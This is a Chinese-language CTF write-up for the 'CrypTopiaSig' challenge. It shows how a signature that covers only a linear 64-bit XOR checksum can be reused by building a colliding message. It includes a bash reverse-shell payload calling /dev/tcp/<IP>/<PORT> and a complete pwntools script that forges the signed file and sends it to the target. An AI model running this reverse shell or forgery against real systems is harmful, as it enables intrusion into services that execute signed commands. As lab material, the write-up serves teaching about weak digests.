# CrypTopiaSig

## 题目简述

目标服务接收 Base64 编码的 `CrypTopiaSig` 文件，验签成功后把其中的数据直接交给 `os.system` 执行。附件同时给出格式解析代码和一个已签名样本，需要在不知道私钥的情况下伪造可执行任意命令的文件。

## 解题过程

签名函数没有直接对完整消息做安全哈希，而是先把消息压缩成一个 64 位异或校验值：

```python
def checksum(data, gen):
    bit_length = gen.bit_length()
    for i, value in enumerate(data):
        gen = (
            gen ^ (value << (i % bit_length))
        ) & (2**bit_length - 1)
    return gen
```

随后所谓的签名只是：

$$
s=\operatorname{checksum}(m)^K\bmod P
$$

因此，签名实际上只认证了 64 位校验值。只要构造出满足

$$
\operatorname{checksum}(m')=\operatorname{checksum}(m)
$$

的新消息 $m'$，就可以原样复用样本文件中的签名。

先选择反弹 shell 作为前缀，并在末尾加上 `;#`：

```text
bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1';#
```

Shell 会把 `#` 后的校验修正字节当作注释，因此这些字节只影响签名校验，不影响前面的命令。将前缀补齐到 64 字节边界后，第一个附加字节正好从偏移 0 开始作用。依次追加 `\x01` 或 `\x02`，可以逐位修正当前消息校验值与目标校验值之间的差异；每追加一个字节便重新计算差值，直到两个校验值相同。不能使用 `\x00`，因为空字节会使后续命令执行失败。

文件格式为：

```text
MAGIC || data_length(6 bytes) || signature_length(6 bytes) || data || signature
```

下面的脚本完成样本解析、碰撞消息构造和文件封装：

```python
import sys
from base64 import b64encode
from pwn import remote

G = 0x8B6EEC60FAE5681C
MAGIC = b"\x01\x02CrypTopiaSig\x03\x04"


def checksum(data):
    value = G
    width = G.bit_length()
    for i, byte in enumerate(data):
        value = (
            value ^ (byte << (i % width))
        ) & (2**width - 1)
    return value


def parse(blob):
    offset = len(MAGIC)
    data_len = int.from_bytes(blob[offset:offset + 6], "big")
    sig_len = int.from_bytes(blob[offset + 6:offset + 12], "big")
    data_start = offset + 12
    signature = blob[
        data_start + data_len:data_start + data_len + sig_len
    ]
    return blob[data_start:data_start + data_len], signature


def pack(data, signature):
    header = (
        MAGIC
        + len(data).to_bytes(6, "big")
        + len(signature).to_bytes(6, "big")
    )
    return header + data + signature


original = (
    b'echo "The date is $(date)\n'
    b'You are $(whoami)\n'
    b'Current directory is $(pwd)"'
)
payload = (
    b"bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1';#"
)

target = checksum(original)
while len(payload) % G.bit_length():
    payload += b"\x01"

while checksum(payload) != target:
    difference = target ^ checksum(payload)
    current_offset = len(payload) % G.bit_length()
    current_bit = (difference >> current_offset) & 1
    payload += b"\x01" if current_bit else b"\x02"

_, signature = parse(open("example.ctpsig", "rb").read())
forged = b64encode(pack(payload, signature))

io = remote(sys.argv[1], int(sys.argv[2]))
io.recvuntil(b"$ ")
io.sendline(forged)
io.close()
```

反弹 shell 建立后读取 `/app/.passwd`，得到：

```text
N0PS{d0nT_s1gN_W17h_ChK5uMz}
```

## 方法总结

公钥签名的安全性不仅取决于模幂运算，也取决于签名前的消息映射。这里把任意长度命令压缩成线性的 64 位异或校验值，使碰撞可以按位构造，最终让攻击者复用合法签名。分析自定义签名格式时，应分别检查消息摘要、签名算法和解析边界；即使模数和私钥足够强，弱摘要也会让整个认证机制失效。
